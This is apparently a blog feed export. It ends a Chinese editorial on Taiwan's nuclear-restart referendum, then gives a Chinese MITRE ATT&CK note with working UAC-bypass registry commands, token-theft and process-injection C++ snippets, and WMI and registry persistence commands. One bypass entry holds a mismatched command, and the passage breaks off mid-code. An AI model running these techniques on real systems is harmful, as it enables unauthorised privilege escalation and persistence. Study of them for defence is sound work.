compared with 50 percent for the region’s average. That leaves Taiwan little flexibility to surge imports or repair facilities.</p></blockquote></li><li><p>文章對比日本與韓國，指出台灣的液化天然氣存儲只夠十天正常使用，並且在戰爭期間可能會被中國封鎖，這使得台灣的能源安全極度脆弱。此外，文章也以烏克蘭與德國作為舉例指出俄羅斯在戰爭期間對歐洲天然氣供應的控制，造成兩國的能源安全受到威脅，並且指出台灣的情況與之類似，建議重啟核能發電廠。</p><blockquote><p>原文:<br>Japan, for instance, spent the past 50 years bolstering its energy security by building extensive storage and creating its own LNG tanker fleet, now the world’s largest, which both transports gas and acts as a form of floating storage. South Korea, meanwhile, maintains a 30-to-40-day supply of LNG to last through its cold winters. Taiwan, by contrast, can store enough for just ten days. With one LNG tanker unloading in a Taiwanese port every day and a half, a naval blockade, or even back-to-back typhoons, could quickly exhaust normal supplies. <br>…<br>In Germany’s case, it grew reliant on Russian fuel, and when Russia invaded Ukraine in 2022, Berlin had to scramble to divest and find other sources. Taiwan, by contrast, still has time to adjust. Investments in grid resiliency and energy storage would help, as would restarting recently closed nuclear reactors.<br>..<br>Since Russia’s invasion of Ukraine, the people of Taiwan have begun to understand that they must take their own security—including energy security—more seriously. They identify with Ukraine, which endures nightly assaults on its power grid. </p></blockquote></li><li><p>文章指出美國好幾座核能發電廠延役並且核監管委員會將幾乎所有操作反應堆的許可證從40年延長到60年，作者認為台灣可以重新啟動其過去幾年關閉的反應堆並且鼓勵台美相關技術交流</p><blockquote><p>原文:<br>Taiwan can also learn from the U.S. example. President Donald Trump has supported a revival of civil nuclear power by signing executive orders that aim to simplify nuclear permitting and reestablish the country “as the global leader in nuclear energy.” Congress has furnished subsidies and grants to keep older nuclear plants operating. And the United States’ Nuclear Regulatory Commission has extended licenses of nearly all operating reactors from 40 years to 60 years, and in some cases, even 80 years. The U.S. technology sector is also resuscitating nuclear power to meet AI energy needs: Microsoft has signed a contract with Constellation Energy, an electric utility company, to reopen a reactor at Three Mile Island.<br>Taiwan could similarly restart the reactors it has closed over the past few years, including those at Maanshan and Kuosheng. </p></blockquote></li><li><p>文章強調台灣民主的命運很可能會取決於其產生和儲存能源的能力，並提出核能發電的防破壞性比其他發電方式更好</p><blockquote><p>原文:<br>The fate of Taiwan’s democracy may well rest in its ability to produce and store energy. If the island can stockpile more of it and resurrect its nuclear reactors, it would be in a much better position to withstand invasion or disruption.</p></blockquote></li></ol>   <!-- - 其他有關論述   1. 台灣半導體產業用電占總用電量8%，為民生總用電量之一半   2. 因為環境議題抗議，第三座天然氣發電廠的建設被阻礙 --><h3 id="小結"><a href="#小結" class="headerlink" title="小結:"></a>小結:</h3><p>透過以上資料佐證<strong>正方之論述- 美國方面 1. 有支持台灣發展&#x2F;重啟核能發電；2. 認為台灣依賴天然氣能源有其風險 ；3. 提供相關技術支持</strong><br>其中，從實際案例(德國、烏克蘭)來看，核能發電為增加台灣能源發展之韌性為一有力論點<br>但是正方論述中提到<strong>美國在台協會表態支持台灣使用核能</strong> *(第三場意見發表)*有斷章取義之疑慮，美國在台協會處長谷立言並無明確支持核能發電，而是強調多元能源解決方案，並且在其他場合也有提到對再生能源的支持。</p><hr><h3 id="火力發電之依賴與其對空間汙染與人民健康影響"><a href="#火力發電之依賴與其對空間汙染與人民健康影響" class="headerlink" title="火力發電之依賴與其對空間汙染與人民健康影響"></a>火力發電之依賴與其對空間汙染與人民健康影響</h3><h4 id="分析對於火力發電之依賴程度"><a href="#分析對於火力發電之依賴程度" class="headerlink" title="分析對於火力發電之依賴程度"></a>分析對於火力發電之依賴程度</h4><p><em>資料來源: <a href="https://www.esist.org.tw/database/search/electric-generation">經濟部能源署</a></em><br><em>資料來源: <a href="https://zh.wikipedia.org/zh-tw/%E8%87%BA%E7%81%A3%E6%A0%B8%E8%83%BD">歷年台灣核能停用事件</a></em><br><em>資料來源: <a href="https://data.gov.tw/dataset/36683">電力消費年資料</a></em></p><ol><li>縱觀2014年(第一核能發電廠1號機除役)以來之台電發電數據<ul><li>圖表: <a href="./Referendum-21-Press-conference/Elec_generation_kind_change.png">台灣各類型發電之變化</a></li><li>紅線表示歷年核電廠廢除事件，由左至右依序為: 第一核能發電廠1號機除役; 第一核能發電廠2號機除役; 第二核能發電廠1號機除役; 第二核能發電廠2號機除役; 第三核能發電廠1號機除役; 第三核能發電廠2號機除役<blockquote><p>此圖表由於尺度過大(千瓦小時)而無法清楚顯示各發電量之變化，因此我將每次核電廠除役事件之前後三個月各項發電變化單獨繪製成表，並將單位轉換成方便於圖表顯示單位</p></blockquote></li></ul></li><li>各次核電機組除役後，台灣各項發電量之變化<ul><li>圖表: <a href="./Referendum-21-Press-conference/after_events_change.png">廢除核電之各項發電變化</a></li><li>由圖表可確實看出台灣火力發電的比例逐漸上升，也顯示出再生能源發電上升程度不如廢除核能發電機組後下降的多</li><li>這顯示出台灣在能源轉型過程中，仍然高度依賴火力發電。<blockquote><p>由圖表可看出台灣總發電量逐年上升，因此編者想確認用電量是否也逐年上升，以用電需求促使發電需求增長解釋此現象</p></blockquote></li></ul></li><li>比較台灣用電量與發電量<ul><li>圖表: <a href="./Referendum-21-Press-conference/generation_consumption_comp.png">發電量與用電量變化走勢圖</a></li><li>由圖表可看出台灣用電趨勢逐年升高，並與發電趨勢呈正相關\<blockquote><p>編者在繪製圖表時發現用電量大於發電量之不合理處，推測發電量數據係指台灣國內之發電量，未將民間自發電、購置電量算入，但兩者趨勢明顯相關，故放入此數據檢驗中<br>若編者後續有查明原因再做更新補充</p></blockquote></li></ul></li></ol><h4 id="火力發電之依賴與其對空間汙染與人民健康影響-1"><a href="#火力發電之依賴與其對空間汙染與人民健康影響-1" class="headerlink" title="火力發電之依賴與其對空間汙染與人民健康影響"></a>火力發電之依賴與其對空間汙染與人民健康影響</h4><p><em>資料來源 <a href="https://www.moenv.gov.tw/affairs/atmospheric-environment/air-quality-observation/air-quality-monitoring-report/672.html">歷年空品監測報告</a></em><br><em>資料來源 <a href="https://airtw.moenv.gov.tw/cht/Query/His_Data.aspx">歷年監測資料</a></em></p><ol><li>觀察各年度中部地區、雲嘉地區<em>主要火力發電區域</em>PM10、PM2.5、CO情形<ol><li><a href="https://service.moenv.gov.tw/file/get/MOENV/zh-tw/9FDF33456FA1DB1F">107年度報告: 3-58~60</a>可得知歷年(98年至107年)來中部地區、雲嘉地區PM10、PM2.5與CO逐年減少</li><li><a href="https://service.moenv.gov.tw/file/get/MOENV/zh-tw/6BB17C4B4AD72C76">109年度報告: 3-50~52</a>也可印證(100年至109年)來中部地區、雲嘉地區PM10、PM2.5與CO逐年減少</li><li><a href="https://service.moenv.gov.tw/File/Get/moenv/zh-tw/C6rMtsEWR5iKiVM">113年度報告: 3-41~43</a>可得知(111年至113年)來中部地區、雲嘉地區PM10、PM2.5有些微上升趨勢，CO則大致維持於0.27ppm左右<em>除了台中地區112年度0.29ppm除外</em><blockquote><p>結合上述對於歷年台灣核電廠啟用與停用事件，在較為密集的停用期間110~114年確實有讓空汙情形持續下降的趨勢漸緩，但並無顯著增加，編者認為<strong>並無法顯現出其對空氣品質與人民健康的顯著影響</strong></p></blockquote></li></ol></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;核能發電廠重啟公投意見發表會分析&quot;&gt;&lt;a href=&quot;#核能發電廠重啟公投意見發表會分析&quot; class=&quot;headerlink&quot; title=&quot;核能發電廠重啟公投意見發表會分析&quot;&gt;&lt;/a&gt;核能發電廠重啟公投意見發表會分析&lt;/h1&gt;&lt;h2 id=&quot;分析方法&quot;&gt;&lt;a </summary>
      
    
    
    
    <category term="社論" scheme="http://withoutdirection.github.io/categories/%E7%A4%BE%E8%AB%96/"/>
    
    
    <category term="能源議題" scheme="http://withoutdirection.github.io/tags/%E8%83%BD%E6%BA%90%E8%AD%B0%E9%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>MITRE ATT&amp;CK 技術筆記</title>
    <link href="http://withoutdirection.github.io/Mitre-ATT-CK-Techniues-note/"/>
    <id>http://withoutdirection.github.io/Mitre-ATT-CK-Techniues-note/</id>
    <published>2025-07-03T16:00:00.000Z</published>
    <updated>2025-07-27T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Privilege-Escalation技術與實作整理（ATT-CK-Framework）"><a href="#Privilege-Escalation技術與實作整理（ATT-CK-Framework）" class="headerlink" title="Privilege Escalation技術與實作整理（ATT&amp;CK Framework）"></a>Privilege Escalation技術與實作整理（ATT&amp;CK Framework）</h1><h2 id="濫用權限提升控制機制-Abuse-Elevation-Control-Mechanism"><a href="#濫用權限提升控制機制-Abuse-Elevation-Control-Mechanism" class="headerlink" title="濫用權限提升控制機制 (Abuse Elevation Control Mechanism)"></a>濫用權限提升控制機制 (Abuse Elevation Control Mechanism)</h2><p><strong>UAC繞過技術：</strong></p><table><thead><tr><th>方法</th><th>原理&#x2F;說明</th><th>實作步驟</th></tr></thead><tbody><tr><td>fodhelper.exe</td><td>利用自動提升權限特性</td><td></td></tr></tbody></table><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKCU\Software\Classes\ms-settings\Shell\Open\command&quot; /ve /t REG_SZ /d &quot;<span class="built_in">cmd</span>.exe&quot; /f</span><br><span class="line">reg add &quot;HKCU\Software\Classes\ms-settings\Shell\Open\command&quot; /v &quot;DelegateExecute&quot; /t REG_SZ /d &quot;&quot; /f</span><br><span class="line">fodhelper.exe</span><br></pre></td></tr></table></figure><p>| eventvwr.exe | 登錄檔劫持 | </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKCU\Software\Classes\mscfile\shell\open\command&quot; /ve /t REG_SZ /d &quot;C:\Windows\System32\<span class="built_in">cmd</span>.exe&quot; /f</span><br><span class="line">reg add &quot;HKCU\Software\Classes\mscfile\shell\open\command&quot; /v &quot;DelegateExecute&quot; /t REG_SZ /d &quot;&quot; /f</span><br><span class="line">    $env:<span class="built_in">PATH</span> -split &#x27;;&#x27; | ForEach-Object &#123; <span class="keyword">if</span> (Test-<span class="built_in">Path</span> $_) &#123; Get-ChildItem $_ -File -Filter &quot;*.dll&quot; &#125; &#125;</span><br></pre></td></tr></table></figure><p>| sdclt.exe | 利用 isolation 功能 | </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKCU\Software\Classes\exefile\shell\runas\command&quot; /ve /t REG_SZ /d &quot;C:\Windows\System32\<span class="built_in">cmd</span>.exe&quot; /f</span><br><span class="line">reg add &quot;HKCU\Software\Classes\exefile\shell\runas\command&quot; /v &quot;IsolatedCommand&quot; /t REG_SZ /d &quot;C:\Windows\System32\<span class="built_in">cmd</span>.exe&quot; /f</span><br><span class="line">sdclt.exe /KickOffElev</span><br></pre></td></tr></table></figure><p>| ComputerDefaults.exe | 利用自動提升權限 | </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKCU\Software\Classes\ms-settings\Shell\Open\command&quot; /ve /t REG_SZ /d &quot;powershell.exe&quot; /f</span><br><span class="line">reg add &quot;HKCU\Software\Classes\ms-settings\Shell\Open\command&quot; /v &quot;DelegateExecute&quot; /t REG_SZ /d &quot;&quot; /f</span><br><span class="line">ComputerDefaults.exe</span><br></pre></td></tr></table></figure><p>| COM 提升標識符 | PowerShell 建立 COM 物件 | </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$com</span> = <span class="built_in">New-Object</span> <span class="literal">-ComObject</span> <span class="string">&quot;Elevation:1!new:&#123;F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4&#125;&quot;</span></span><br><span class="line"><span class="variable">$com</span>.ExecuteCommand(<span class="string">&quot;cmd.exe&quot;</span>)</span><br></pre></td></tr></table></figure><hr><h2 id="存取權杖操控-Access-Token-Manipulation"><a href="#存取權杖操控-Access-Token-Manipulation" class="headerlink" title="存取權杖操控 (Access Token Manipulation)"></a>存取權杖操控 (Access Token Manipulation)</h2><p><strong>常見技術與範例：</strong></p><ul><li>權杖模擬&#x2F;竊取  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 開啟目標處理程序</span></span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION, FALSE, dwPID);</span><br><span class="line"><span class="comment">// 開啟處理程序權杖</span></span><br><span class="line">HANDLE hToken;</span><br><span class="line"><span class="built_in">OpenProcessToken</span>(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &amp;hToken);</span><br><span class="line"><span class="comment">// 複製權杖</span></span><br><span class="line">HANDLE hDupToken;</span><br><span class="line"><span class="built_in">DuplicateToken</span>(hToken, SecurityImpersonation, &amp;hDupToken);</span><br><span class="line"><span class="comment">// 模擬權杖</span></span><br><span class="line"><span class="built_in">ImpersonateLoggedOnUser</span>(hDupToken);</span><br><span class="line"><span class="comment">// 使用權杖建立處理程序</span></span><br><span class="line"><span class="built_in">CreateProcessWithTokenW</span>(hDupToken, <span class="number">0</span>, <span class="string">L&quot;cmd.exe&quot;</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br></pre></td></tr></table></figure></li><li>Named Pipe 模擬  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hPipe = <span class="built_in">CreateNamedPipe</span>(<span class="string">L&quot;\\.\\pipe\\test&quot;</span>, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, <span class="number">1</span>, <span class="number">1024</span>, <span class="number">1024</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">ConnectNamedPipe</span>(hPipe, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">ImpersonateNamedPipeClient</span>(hPipe);</span><br></pre></td></tr></table></figure></li><li>SeDebugPrivilege 提升  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hToken;</span><br><span class="line"><span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken);</span><br><span class="line">TOKEN_PRIVILEGES tp;</span><br><span class="line">tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line">tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line"><span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tp, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></li><li>SeImpersonatePrivilege 濫用（Potato 攻擊）  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 建立 BITS 作業觸發 SYSTEM 權杖</span></span><br><span class="line"><span class="comment">// 使用 COM 介面攔截 SYSTEM 權杖</span></span><br><span class="line"><span class="comment">// 透過 Named Pipe 或 RPC 進行權杖竊取</span></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="開機或登入時自動啟動執行-Boot-or-Logon-Autostart-Execution"><a href="#開機或登入時自動啟動執行-Boot-or-Logon-Autostart-Execution" class="headerlink" title="開機或登入時自動啟動執行 (Boot or Logon Autostart Execution)"></a>開機或登入時自動啟動執行 (Boot or Logon Autostart Execution)</h2><p><strong>常見登錄檔位置：</strong></p><table><thead><tr><th>層級</th><th>路徑</th></tr></thead><tbody><tr><td>系統</td><td><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code> 等</td></tr><tr><td>使用者</td><td><code>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code> 等</td></tr></tbody></table><p><strong>Winlogon 協助程式機碼：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</span><br><span class="line">...（略）</span><br></pre></td></tr></table></figure><p><strong>LSA 安全性套件註冊：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Authentication Packages</span><br><span class="line">...（略）</span><br></pre></td></tr></table></figure><p><strong>範例：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">SpLsaModeInitialize</span><span class="params">(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE *ppTables, PULONG pcTables)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 攔截認證資訊</span></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="建立或修改系統處理程序-Create-or-Modify-System-Process"><a href="#建立或修改系統處理程序-Create-or-Modify-System-Process" class="headerlink" title="建立或修改系統處理程序 (Create or Modify System Process)"></a>建立或修改系統處理程序 (Create or Modify System Process)</h2><ul><li><strong>Windows 服務建立&#x2F;劫持</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SC_HANDLE schSCManager = <span class="built_in">OpenSCManager</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">SC_HANDLE schService = <span class="built_in">CreateService</span>(schSCManager, <span class="string">L&quot;MaliciousService&quot;</span>, <span class="string">L&quot;Legitimate Service&quot;</span>, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, <span class="string">L&quot;C:\malicious.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">StartService</span>(schService, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></li><li><strong>服務 DLL 劫持</strong>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Services\[服務名稱]\Parameters&quot; /v &quot;ServiceDll&quot; /t REG_EXPAND_SZ /d &quot;C:\malicious.dll&quot; /f</span><br></pre></td></tr></table></figure></li><li><strong>WMI 服務註冊</strong>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$service</span> = ([<span class="type">wmiclass</span>]<span class="string">&quot;Win32_BaseService&quot;</span>).CreateInstance()</span><br><span class="line"><span class="variable">$service</span>.Name = <span class="string">&quot;MaliciousWMIService&quot;</span></span><br><span class="line"><span class="variable">$service</span>.DisplayName = <span class="string">&quot;Legitimate WMI Service&quot;</span></span><br><span class="line"><span class="variable">$service</span>.PathName = <span class="string">&quot;C:\malicious.exe&quot;</span></span><br><span class="line"><span class="variable">$service</span>.ServiceType = [<span class="type">uint32</span>]<span class="number">16</span></span><br><span class="line"><span class="variable">$service</span>.StartMode = <span class="string">&quot;Auto&quot;</span></span><br><span class="line"><span class="variable">$service</span>.Put()</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="事件觸發執行-Event-Triggered-Execution"><a href="#事件觸發執行-Event-Triggered-Execution" class="headerlink" title="事件觸發執行 (Event Triggered Execution)"></a>事件觸發執行 (Event Triggered Execution)</h2><ul><li><strong>WMI 事件訂閱</strong>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$EventFilter</span> = <span class="built_in">Set-WmiInstance</span> <span class="literal">-Class</span> __EventFilter <span class="literal">-NameSpace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123; Name = <span class="string">&quot;MaliciousFilter&quot;</span>; EventNameSpace = <span class="string">&quot;root\cimv2&quot;</span>; QueryLanguage = <span class="string">&quot;WQL&quot;</span>; Query = <span class="string">&quot;SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = &#x27;notepad.exe&#x27;&quot;</span> &#125;</span><br><span class="line"><span class="variable">$EventConsumer</span> = <span class="built_in">Set-WmiInstance</span> <span class="literal">-Class</span> CommandLineEventConsumer <span class="literal">-NameSpace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123; Name = <span class="string">&quot;MaliciousConsumer&quot;</span>; CommandLineTemplate = <span class="string">&quot;powershell.exe -enc [Base64編碼的PowerShell命令]&quot;</span> &#125;</span><br><span class="line"><span class="built_in">Set-WmiInstance</span> <span class="literal">-Class</span> __FilterToConsumerBinding <span class="literal">-NameSpace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123; <span class="keyword">Filter</span> = <span class="variable">$EventFilter</span>; Consumer = <span class="variable">$EventConsumer</span> &#125;</span><br></pre></td></tr></table></figure></li><li><strong>預設檔案關聯修改</strong>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.txt\OpenWithProgids&quot; /v &quot;malicious_auto_file&quot; /t REG_NONE /f</span><br><span class="line">reg add &quot;HKCU\Software\Classes\malicious_auto_file\shell\open\command&quot; /ve /t REG_SZ /d &quot;C:\malicious.exe %<span class="number">1</span>&quot; /f</span><br></pre></td></tr></table></figure></li><li><strong>螢幕保護程式劫持</strong>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKCU\Control Panel\Desktop&quot; /v &quot;SCRNSAVE.EXE&quot; /t REG_SZ /d &quot;C:\malicious.scr&quot; /f</span><br><span class="line">reg add &quot;HKCU\Control Panel\Desktop&quot; /v &quot;ScreenSaveActive&quot; /t REG_SZ /d &quot;<span class="number">1</span>&quot; /f</span><br><span class="line">reg add &quot;HKCU\Control Panel\Desktop&quot; /v &quot;ScreenSaveTimeout&quot; /t REG_SZ /d &quot;<span class="number">60</span>&quot; /f</span><br></pre></td></tr></table></figure></li><li><strong>Netsh 協助程式 DLL</strong>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh add helper C:\malicious.dll</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="劫持執行流程-Hijack-Execution-Flow"><a href="#劫持執行流程-Hijack-Execution-Flow" class="headerlink" title="劫持執行流程 (Hijack Execution Flow)"></a>劫持執行流程 (Hijack Execution Flow)</h2><ul><li><strong>DLL 搜尋順序劫持</strong><ol><li>應用程式載入目錄</li><li>系統目錄 (System32)</li><li>16位元系統目錄 (System)</li><li>Windows 目錄</li><li>當前目錄</li><li>PATH 環境變數目錄</li></ol></li><li><strong>DLL 代理技術</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/EXPORT:FunctionName=OriginalDLL.FunctionName,@1&quot;</span>)</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (fdwReason == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, MaliciousThread, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>COM 劫持</strong>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Classes\CLSID\&#123;CLSID&#125;\InprocServer32&quot; /ve /t REG_SZ /d &quot;C:\malicious.dll&quot; /f</span><br><span class="line">reg add &quot;HKCU\Software\Classes\CLSID\&#123;CLSID&#125;\InprocServer32&quot; /ve /t REG_SZ /d &quot;C:\malicious.dll&quot; /f</span><br></pre></td></tr></table></figure></li><li><strong>COR_PROFILER 劫持</strong>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> COR_ENABLE_PROFILING=<span class="number">1</span></span><br><span class="line"><span class="built_in">set</span> COR_PROFILER=&#123;CLSID&#125;</span><br><span class="line"><span class="built_in">set</span> COR_PROFILER_PATH=C:\malicious.dll</span><br></pre></td></tr></table></figure></li><li><strong>KernelCallbackTable 劫持</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PPEB pPeb = (PPEB)__readgsqword(<span class="number">0x60</span>);</span><br><span class="line">PVOID* pKernelCallbackTable = (PVOID*)pPeb-&gt;KernelCallbackTable;</span><br><span class="line"><span class="built_in">VirtualProtect</span>(pKernelCallbackTable, <span class="built_in">sizeof</span>(PVOID) * <span class="number">1024</span>, PAGE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">pKernelCallbackTable[<span class="number">0</span>] = (PVOID)MaliciousCallback;</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="處理程序注入-Process-Injection"><a href="#處理程序注入-Process-Injection" class="headerlink" title="處理程序注入 (Process Injection)"></a>處理程序注入 (Process Injection)</h2><ul><li><strong>手動 DLL 對應</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LPVOID pImageBase = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, pImageBase, pDllBuffer, dwImageSize, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)((DWORD_PTR)pImageBase + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint), <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></li><li><strong>反射式 DLL 注入</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HMODULE WINAPI <span class="title">ReflectiveLoader</span><span class="params">(VOID)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 解析 PE 結構</span></span><br><span class="line">    <span class="comment">// 處理重定位</span></span><br><span class="line">    <span class="comment">// 解析匯入表</span></span><br><span class="line">    <span class="comment">// 呼叫 DLL 主函式</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>進階處理程序挖空</strong>  <figure class="highlight 